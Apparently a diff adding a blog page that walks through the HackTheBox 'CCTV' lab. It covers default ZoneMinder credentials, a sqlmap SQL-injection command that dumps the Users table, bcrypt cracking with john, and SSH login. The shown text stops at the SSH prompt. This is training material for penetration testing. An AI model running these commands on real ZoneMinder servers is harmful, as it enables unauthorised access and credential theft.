@@ -1,0 +1,1003 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+<link rel="icon" type="image/x-icon" href="/cybersec_logo.ico">
+<title>CCTV - Exploiting outdated services with SQL injection</title>
+<script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+<link rel="stylesheet" type='text/css' href="https://cdn.jsdelivr.net/gh/devicons/devicon@latest/devicon.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.1/css/all.min.css"
+  integrity="sha512-2SwdPD6INVrV/lHTZbO2nodKhrnDdJK9/kg2XD1r9uGqPo1cUbujc+IYdlYdEErWNu69gVcYgdxlmVmzTWnetw=="
+  crossorigin="anonymous" referrerpolicy="no-referrer" />
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Ubuntu+Sans+Mono:ital,wght@0,400..700;1,400..700&display=swap');
+
+  .font-jersey {
+
+    font-family: "Ubuntu Sans Mono", monospace;
+    font-optical-sizing: auto;
+    font-style: normal;
+  }
+
+
+  .md-content .katex-display {
+    max-width: 100%;
+    overflow-x: auto;
+    overflow-y: hidden;
+    -webkit-overflow-scrolling: touch;
+    padding-left: 0.25rem;
+    padding-right: 0.25rem;
+  }
+
+  .md-content .katex-display>.katex {
+    display: inline-block;
+    max-width: 100%;
+  }
+
+  .swup-transition-fade {
+    opacity: 1;
+    transition: 300ms ease-in-out;
+  }
+
+  .is-animating .swup-transition-fade {
+    opacity: 0;
+  }
+
+  .swup-transition-fade {
+    opacity: 1;
+    transition: opacity 300ms ease-in-out;
+  }
+
+  html.is-animating .swup-transition-fade {
+    opacity: 0;
+  }
+
+  html.is-animating {
+    cursor: progress;
+  }
+
+  html.is-leaving .swup-transition-fade {
+    opacity: 0;
+  }
+</style>
+
+<script src="https://unpkg.com/swup@4"></script>
+<script src="https://unpkg.com/@swup/preload-plugin@3"></script>
+<script src="https://unpkg.com/@swup/progress-plugin@3"></script>
+<script>
+  const swup = new Swup({
+    containers: ['#swup'],
+    animationSelector: '[class*="swup-transition-"]',
+    cache: true,
+    preload: true,
+    animateHistoryBrowsing: true,
+
+    plugins: [
+      new SwupPreloadPlugin(),
+      new SwupProgressPlugin()
+    ]
+  })
+  window.swup = swup
+</script>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.css" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.js" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/contrib/auto-render.min.js"
+  crossorigin="anonymous"></script>
+
+<script>
+  
+
+  
+  const KATEX_CONFIG = {
+    delimiters: [
+      {left: "$$", right: "$$", display: true},
+      {left: "$", right: "$", display: false},
+      {left: "\\[", right: "\\]", display: true},
+      {left: "\\(", right: "\\)", display: false}
+    ],
+    ignoredTags: ["script", "noscript", "style", "textarea", "pre", "code"],
+    throwOnError: false
+  };
+
+  
+  function renderKatex() {
+    
+    if (typeof renderMathInElement !== "function") {
+      console.log("⏳ Waiting for KaTeX to load...");
+      return;
+    }
+
+    
+    const contentArea = document.getElementById('swup') || document.body;
+
+    try {
+      renderMathInElement(contentArea, KATEX_CONFIG);
+      console.log("✅ KaTeX rendered successfully");
+    } catch (error) {
+      console.error("❌ KaTeX rendering error:", error);
+    }
+  }
+
+  
+  function renderKatexWithRetry(maxRetries = 10, delay = 100) {
+    let attempts = 0;
+
+    const attempt = () => {
+      if (typeof renderMathInElement === "function") {
+        renderKatex();
+      } else if (attempts < maxRetries) {
+        attempts++;
+        setTimeout(attempt, delay);
+      } else {
+        console.warn("⚠️ KaTeX auto-render not available after", maxRetries, "attempts");
+      }
+    };
+
+    attempt();
+  }
+
+  
+  function setupSwupIntegration() {
+    
+    if (window.swup) {
+      window.swup.hooks.on('page:view', () => {
+        console.log("🔄 Swup transition complete, re-rendering KaTeX...");
+        
+        setTimeout(() => renderKatexWithRetry(3, 50), 50);
+      });
+      console.log("✅ KaTeX-Swup integration ready");
+    } else {
+      
+      setTimeout(setupSwupIntegration, 100);
+    }
+  }
+
+  
+  document.addEventListener("DOMContentLoaded", function () {
+    console.log("🚀 Initializing KaTeX...");
+
+    
+    renderKatexWithRetry();
+
+    
+    setupSwupIntegration();
+  });
+
+  
+  window.renderKatex = renderKatex;
+</script>
+
+<script type="module">
+  import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.esm.min.mjs';
+
+  let initialized = false;
+
+  function renderMermaid() {
+    const contentArea = document.getElementById('swup') || document.body;
+    const mermaidBlocks = contentArea.querySelectorAll('.language-mermaid, .mermaid');
+
+    if (mermaidBlocks.length === 0) {
+      console.log("ℹ️ No mermaid blocks found on this page");
+      return;
+    }
+
+    if (!initialized) {
+      mermaid.initialize({startOnLoad: false, theme: 'dark'});
+      initialized = true;
+    }
+
+    mermaidBlocks.forEach(el => {
+      if (el.dataset.processed === 'true') {
+        const source = el.dataset.mermaidSource;
+        if (source) {
+          el.innerHTML = source;
+          el.removeAttribute('data-processed');
+        }
+      } else {
+        el.dataset.mermaidSource = el.textContent;
+      }
+    });
+
+    mermaid.run({nodes: mermaidBlocks})
+      .then(() => console.log("✅ Mermaid rendered successfully"))
+      .catch(err => console.error("❌ Mermaid rendering error:", err));
+  }
+
+  function renderMermaidWithRetry(maxRetries = 10, delay = 100) {
+    let attempts = 0;
+
+    const attempt = () => {
+      if (typeof mermaid.initialize === "function") {
+        renderMermaid();
+      } else if (attempts < maxRetries) {
+        attempts++;
+        setTimeout(attempt, delay);
+      } else {
+        console.warn("⚠️ Mermaid auto-render not available after", maxRetries, "attempts");
+      }
+    };
+
+    attempt();
+  }
+
+  
+  function setupSwupIntegration() {
+    
+    if (window.swup) {
+      window.swup.hooks.on('page:view', () => {
+        console.log("🔄 Swup transition complete, re-rendering mermaid...");
+        
+        setTimeout(() => renderMermaidWithRetry(3, 50), 50);
+      });
+      console.log("✅ Mermaid-Swup integration ready");
+    } else {
+      
+      setTimeout(setupSwupIntegration, 100);
+    }
+  }
+
+  
+  document.addEventListener("DOMContentLoaded", function () {
+    console.log("🚀 Initializing KaTeX...");
+
+    
+    renderMermaidWithRetry();
+
+    
+    setupSwupIntegration();
+  });
+
+
+
+</script>
+
+
+</head>
+
+<body class="min-h-screen flex flex-col bg-black font-jersey text-white text-3xl">
+  <header>
+    <div class="sticky absolute top-0 z-50">
+  <nav class="w-full border-b border-gray-800 bg-[#070709]/95 backdrop-blur-sm text-gray-100">
+    <div class="max-w-6xl mx-auto px-4 sm:px-6">
+      <div class="flex items-center justify-between h-16">
+        
+        <div class="flex items-center gap-3">
+
+          <a href='http://localhost:1313/' class="flex items-center gap-3 group" aria-label="Homepage">
+
+            <img src='/cybersec_logo.png' alt="Esteban Pangelinan - Cybersecurity"
+              class="w-10 h-10 rounded-sm border-2 border-gray-700 object-cover transition-transform duration-300 transform group-hover:scale-105"
+              style="animation: border-breathe 4s ease-in-out infinite;" />
+            <span class="text-white text-lg sm:text-xl md:text-2xl lg:text-3xl font-semibold tracking-wide">
+              root@epangelinan: cd
+              <span class="inline-block ml-2" style="animation: flicker 1.6s steps(2, end) infinite;">_</span>
+            </span>
+          </a>
+        </div>
+
+        
+        <div class="flex items-center gap-4">
+          
+          <div class="hidden md:flex items-center">
+            
+
+<nav aria-label="Primary" class="w-full">
+  <ul
+    class="flex flex-col md:flex-row md:items-center md:space-x-6 space-y-2 md:space-y-0 sm:text-lg md:text-xl lg:text-3xl"><li>
+      <a aria-current="true" href="/writeups/"class="group inline-flex items-center px-3 py-2 rounded-sm text-gray-200 hover:text-white transition-colors duration-200">
+        <span class="relative inline-block">
+          <span>/writeups</span>
+          
+          <span
+            class="absolute left-0 -bottom-1 h-[2px] w-0 bg-indigo-400 transition-all duration-300 group-hover:w-full"></span>
+        </span>
+      </a>
+    </li><li>
+      <a href="/projects/"class="group inline-flex items-center px-3 py-2 rounded-sm text-gray-200 hover:text-white transition-colors duration-200">
+        <span class="relative inline-block">
+          <span>/projects</span>
+          
+          <span
+            class="absolute left-0 -bottom-1 h-[2px] w-0 bg-indigo-400 transition-all duration-300 group-hover:w-full"></span>
+        </span>
+      </a>
+    </li>
+  </ul>
+</nav>
+
+          </div>
+
+          
+          <div class="md:hidden">
+            <button id="nav-toggle" aria-controls="mobile-menu" aria-expanded="false"
+              class="inline-flex items-center justify-center p-2 rounded-md focus:outline-none focus:ring-2 focus:ring-indigo-400"
+              aria-label="Open menu">
+              <svg class="h-6 w-6 text-gray-200" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"
+                stroke="currentColor" aria-hidden="true">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16" />
+              </svg>
+            </button>
+          </div>
+        </div>
+      </div>
+
+      
+      <div id="mobile-menu" class="md:hidden hidden pb-4">
+        
+        
+
+<nav aria-label="Primary" class="w-full">
+  <ul
+    class="flex flex-col md:flex-row md:items-center md:space-x-6 space-y-2 md:space-y-0 sm:text-lg md:text-xl lg:text-3xl"><li>
+      <a aria-current="true" href="/writeups/"class="group inline-flex items-center px-3 py-2 rounded-sm text-gray-200 hover:text-white transition-colors duration-200">
+        <span class="relative inline-block">
+          <span>/writeups</span>
+          
+          <span
+            class="absolute left-0 -bottom-1 h-[2px] w-0 bg-indigo-400 transition-all duration-300 group-hover:w-full"></span>
+        </span>
+      </a>
+    </li><li>
+      <a href="/projects/"class="group inline-flex items-center px-3 py-2 rounded-sm text-gray-200 hover:text-white transition-colors duration-200">
+        <span class="relative inline-block">
+          <span>/projects</span>
+          
+          <span
+            class="absolute left-0 -bottom-1 h-[2px] w-0 bg-indigo-400 transition-all duration-300 group-hover:w-full"></span>
+        </span>
+      </a>
+    </li>
+  </ul>
+</nav>
+
+      </div>
+    </div>
+  </nav>
+
+  
+  <style>
+    @keyframes flicker {
+      0% {
+        opacity: 1;
+        transform: translateY(0);
+      }
+
+      10% {
+        opacity: 0.2;
+        transform: translateY(-1px);
+      }
+
+      20% {
+        opacity: 1;
+        transform: translateY(0);
+      }
+
+      100% {
+        opacity: 1;
+      }
+    }
+
+    @keyframes border-breathe {
+      0% {
+        box-shadow: 0 0 0 0 rgba(99, 102, 241, 0.06);
+      }
+
+      50% {
+        box-shadow: 0 0 18px 6px rgba(99, 102, 241, 0.03);
+      }
+
+      100% {
+        box-shadow: 0 0 0 0 rgba(99, 102, 241, 0.06);
+      }
+    }
+  </style>
+
+  
+  <script>
+    (function () {
+      const btn = document.getElementById('nav-toggle');
+      const menu = document.getElementById('mobile-menu');
+      if (!btn || !menu) return;
+      btn.addEventListener('click', () => {
+        const open = menu.classList.toggle('hidden') === false;
+        btn.setAttribute('aria-expanded', open ? 'true' : 'false');
+      });
+    })();
+  </script>
+</div>
+
+  </header>
+
+  <main class="flex-1 w-full">
+    <div id="swup" class="swup-transition-fade">
+      <div class="max-w-3xl lg:max-w-6xl xl:max-w-7xl mx-auto px-5 sm:px-8 lg:px-10 py-10 lg:py-16">
+        
+<main class="max-w-6xl mx-auto px-4 sm:px-6 pt-24 pb-12 text-gray-100">
+  <div class="grid grid-cols-12 gap-6">
+    <aside class="hidden lg:block col-span-3">
+      <div class="sticky top-24">
+        <div class="mb-3 text-xs uppercase tracking-widest text-gray-500">Table of Contents</div><nav class="toc text-sm text-gray-300 border border-gray-800/70 bg-[#070709] rounded-sm p-4">
+          <nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview"><strong>OVERVIEW</strong></a></li>
+    <li><a href="#recon"><strong>RECON</strong></a></li>
+    <li><a href="#enumeration"><strong>ENUMERATION</strong></a></li>
+    <li><a href="#foothold"><strong>FOOTHOLD</strong></a></li>
+    <li><a href="#privesc"><strong>PRIVESC</strong></a></li>
+    <li><a href="#takeaways"><strong>TAKEAWAYS</strong></a></li>
+  </ul>
+</nav>
+        </nav></div>
+    </aside>
+
+    <article class="col-span-12 lg:col-span-7">
+      <header class="mb-6">
+  <h1 class="text-2xl sm:text-3xl md:text-4xl tracking-wide text-white">
+    CCTV - Exploiting outdated services with SQL injection
+  </h1>
+
+  <div class="mt-2 flex flex-wrap items-center gap-x-3 gap-y-2 text-sm sm:text-base text-gray-400">
+    <span class="font-mono">May 15, 2026 • 16:20</span>
+    <span class="text-gray-700">/</span>
+    <span class="font-mono">8 min read</span>
+  </div><div class="mt-3 flex flex-wrap gap-2"><a href="/%20tags/htb-easy"
+      class="px-2 py-0.5 text-xs sm:text-sm rounded-sm border border-gray-700/70 text-gray-300 bg-black/30 hover:text-white hover:border-indigo-400/40 transition-colors">
+      #HTB - Easy
+    </a><a href="/%20tags/linux"
+      class="px-2 py-0.5 text-xs sm:text-sm rounded-sm border border-gray-700/70 text-gray-300 bg-black/30 hover:text-white hover:border-indigo-400/40 transition-colors">
+      #Linux
+    </a><a href="/%20tags/pentesting"
+      class="px-2 py-0.5 text-xs sm:text-sm rounded-sm border border-gray-700/70 text-gray-300 bg-black/30 hover:text-white hover:border-indigo-400/40 transition-colors">
+      #Pentesting
+    </a></div></header>
+
+
+      <div class="lg:hidden mb-6">
+        <details class="border border-gray-800/70 bg-[#070709] rounded-sm">
+          <summary class="cursor-pointer select-none px-4 py-3 text-gray-200 hover:text-white transition-colors">
+            Table of Contents
+          </summary>
+          <div class="px-4 pb-4 toc text-sm text-gray-300">
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview"><strong>OVERVIEW</strong></a></li>
+    <li><a href="#recon"><strong>RECON</strong></a></li>
+    <li><a href="#enumeration"><strong>ENUMERATION</strong></a></li>
+    <li><a href="#foothold"><strong>FOOTHOLD</strong></a></li>
+    <li><a href="#privesc"><strong>PRIVESC</strong></a></li>
+    <li><a href="#takeaways"><strong>TAKEAWAYS</strong></a></li>
+  </ul>
+</nav>
+          </div>
+        </details>
+      </div>
+
+      <div class="md-surface border border-gray-800/70 bg-[#070709] rounded-sm p-4 sm:p-6">
+        <div class="md-content text-base leading-relaxed text-gray-200">
+          <h2 id="overview" class="mt-8 mb-3 text-xl sm:text-2xl text-white">
+    <span class="relative inline-block">
+      <strong>OVERVIEW</strong>
+      <span
+        class="absolute left-0 -bottom-1 h-px w-0 bg-indigo-400"></span>
+    </span>
+</h2>
+<p><em>CCTV</em> is an easy-rated Linux machine on the HackTheBox platform. Hacking into the machine requires SQL injection to extract passwords from a database, cracking password hashes to gain a foothold on the machine, and privilege escalation through RCE.</p>
+<h2 id="recon" class="mt-8 mb-3 text-xl sm:text-2xl text-white">
+    <span class="relative inline-block">
+      <strong>RECON</strong>
+      <span
+        class="absolute left-0 -bottom-1 h-px w-0 bg-indigo-400"></span>
+    </span>
+</h2>
+<p>After obtaining the target machine&rsquo;s IP address, I ran an nmap scan to identify open TCP ports:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# nmap -sS -oN nmap_scan.txt 10.129.7.141                     </span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>The scan revealed two open TCP ports for SSH and HTTP (a stealth scan was necessary to stop the machine from crashing).</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-05-27 11:19 PDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.7.141
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.20s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp open  ssh
+</span></span><span style="display:flex;"><span>80/tcp open  http
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 2.00 seconds</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>Next, I went to visit the target&rsquo;s IP in a web browser to see what pops up. I found the domain name, <strong>cctv.htb</strong>, and after adding it to my <strong>/etc/hosts</strong> file, I was able to find this webpage:
+<img class="mx-auto my-6 rounded-md border border-gray-800/70 bg-black/20" src="/images/cctv/homepage.png" loading="lazy" decoding="async"
+  alt="cctv landing page">
+The website seemed to be hosting a security camera monitoring service. On the surface, there wasn&rsquo;t anything on the site that stood out to me, so I went ahead and began enumerating.</p>
+<h2 id="enumeration" class="mt-8 mb-3 text-xl sm:text-2xl text-white">
+    <span class="relative inline-block">
+      <strong>ENUMERATION</strong>
+      <span
+        class="absolute left-0 -bottom-1 h-px w-0 bg-indigo-400"></span>
+    </span>
+</h2>
+<p>I searched the site for endpoints using gobuster and fuzzed the URL for subdomains but came up with nothing. The only other endpoint that was worth digging into was <strong><a href="http://cctv.htb/zm/">http://cctv.htb/zm/</a></strong>, which was hyperlinked to the <em>Staff Login</em> button on the home page.<br>
+ <br>
+The page was just a bare-bones login form, but it was used to connect to a service called <strong>ZoneMinder</strong>.
+<img class="mx-auto my-6 rounded-md border border-gray-800/70 bg-black/20" src="/images/cctv/zoneminder.png" loading="lazy" decoding="async"
+  alt="zoneminder login page">
+My first instict was to try default credentials, so I typed in <strong>admin</strong> for both the username and password. To my surprise, I was able to get in first try! (As it turns out, those creds are used by default for ZoneMinder)<br>
+ <br>
+The dashboard looked something like this:
+<img class="mx-auto my-6 rounded-md border border-gray-800/70 bg-black/20" src="/images/cctv/dashboard.png" loading="lazy" decoding="async"
+  alt="dashboard for zoneminder">
+Not so interesting at first glance. But very revealing, because the version number is in bright yellow letters on the right hand side&mdash;<br>
+ <br>
+<strong>v1.37.63</strong><br>
+ <br>
+I kept this in mind and went through the rest of the site searching for anything I could leverage to pop a shell. In the <strong>Options</strong> tab under <strong>Users</strong>, I was able to find two other users on the target, <strong>mark</strong> and <strong>superadmin</strong>.<br>
+ <br>
+Other than that, the rest of the options didn&rsquo;t seem like attack vectors. So, I went back to the version number and got straight to searching for known vulnerabilities. After doing some digging, I came across this vulnerable URL endpoint on GitHub that can be exploited using <strong>sqlmap</strong>:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u http://hostname_or_ip/zm/index.php?view<span style="color:#f92672">=</span>request&amp;request<span style="color:#f92672">=</span>event&amp;action<span style="color:#f92672">=</span>removetag&amp;tid<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span></span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>I modified the command for my target machine, and also added a <strong>cookie</strong> flag to use the <strong>ZoneMinder session ID</strong> from my unprivileged account. I targeted the <strong>zm</strong> database and <strong>Users</strong> table and dumped the data to my attacking machine:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# sqlmap -u <span style="color:#e6db74">&#39;http://cctv.htb/zm/index.php?view=request&amp;request=event&amp;action=removetag&amp;tid=1&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>--cookie <span style="color:#e6db74">&#34;ZMSESSID=5hbje44ebg6n3n0s61f0bhbr6a&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>-D zm -T Users --dump</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>The output got saved into a <strong>Users.csv</strong> file, which contained the following credentials:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/…/output/cctv.htb/dump/zm<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# cat Users.csv
+</span></span><span style="display:flex;"><span>Username,Password
+</span></span><span style="display:flex;"><span>superadmin,$2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm
+</span></span><span style="display:flex;"><span>mark,$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.
+</span></span><span style="display:flex;"><span>admin,$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>All I had to do now was crack the password hashes!<br>
+ <br>
+The format of the hashes were bcrypt, with a cost factor of 10. I attempted to crack them using the <strong>john the ripper</strong> tool and the <strong>rockyou.txt</strong> password list:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# john hash.txt --format<span style="color:#f92672">=</span>bcrypt --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>bcrypt <span style="color:#f92672">[</span>Blowfish 32/64 X3<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>iteration count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">1024</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">4</span> OpenMP threads
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span>opensesame       <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span>     
+</span></span><span style="display:flex;"><span>1g 0:00:00:26 DONE <span style="color:#f92672">(</span>2026-05-28 18:46<span style="color:#f92672">)</span> 0.03742g/s 223.6p/s 223.6c/s 223.6C/s cristhian..tuyyo
+</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span style="display:flex;"><span>Session completed.</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>The cracked password above is for the user <strong>mark</strong>, whose password I attempted to crack first. Trying to run john against the <strong>superadmin</strong> user went on for way too long, so I gave up on trying to crack that and instead used the <strong>mark</strong> user to SSH into the target machine.</p>
+<h2 id="foothold" class="mt-8 mb-3 text-xl sm:text-2xl text-white">
+    <span class="relative inline-block">
+      <strong>FOOTHOLD</strong>
+      <span
+        class="absolute left-0 -bottom-1 h-px w-0 bg-indigo-400"></span>
+    </span>
+</h2>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# ssh mark@cctv.htb
+</span></span><span style="display:flex;"><span>mark@cctv.htb<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
